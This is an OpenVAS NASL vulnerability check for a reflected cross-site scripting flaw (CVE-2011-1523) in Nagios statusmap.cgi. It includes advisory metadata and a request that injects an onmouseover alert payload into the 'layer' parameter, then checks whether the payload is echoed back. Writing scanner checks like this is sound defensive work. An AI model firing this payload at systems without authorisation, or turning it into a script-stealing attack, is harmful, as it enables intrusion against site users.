###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagios_layer_xss_vuln.nasl 7019 2017-08-29 11:51:27Z teissa $
#
# Nagios 'layer' Cross-Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.

Impact Level: Application";

tag_affected = "Nagios versions 3.2.3 and prior.";

tag_insight = "The flaw is caused by improper validation of user-supplied input
passed via the 'layer' parameter to cgi-bin/statusmap.cgi, which allows
attackers to execute arbitrary HTML and script code on the web server.";

tag_solution = "Upgrade to Nagios version 3.3.1 or later.
For updates refer to http://www.nagios.org/";

tag_summary = "This host is running Nagios and is prone to cross site scripting
vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801865";
CPE = "cpe:/a:nagios:nagios";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7019 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-29 13:51:27 +0200 (Tue, 29 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-03-16 15:16:52 +0100 (Wed, 16 Mar 2011)");
  script_bugtraq_id(46826);
  script_cve_id("CVE-2011-1523");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Nagios 'layer' Cross-Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43287");
  script_xref(name : "URL" , value : "http://tracker.nagios.org/view.php?id=207");
  script_xref(name : "URL" , value : "http://www.rul3z.de/advisories/SSCHADV2011-002.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/99164/SSCHADV2011-002.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("nagios_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("nagios/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

if(dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))
{
  ## Construct attack request
  url = dir + "/cgi-bin/statusmap.cgi?layer=%27%20onmouseover=%22alert" +
              "(%27openvas-xss-test%27)%22";

  ## Try XSS and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, check_header: TRUE,
                     pattern:"alert\('openvas-xss-test'\)"))
  {
    security_message(port);
    exit(0);
  }
}
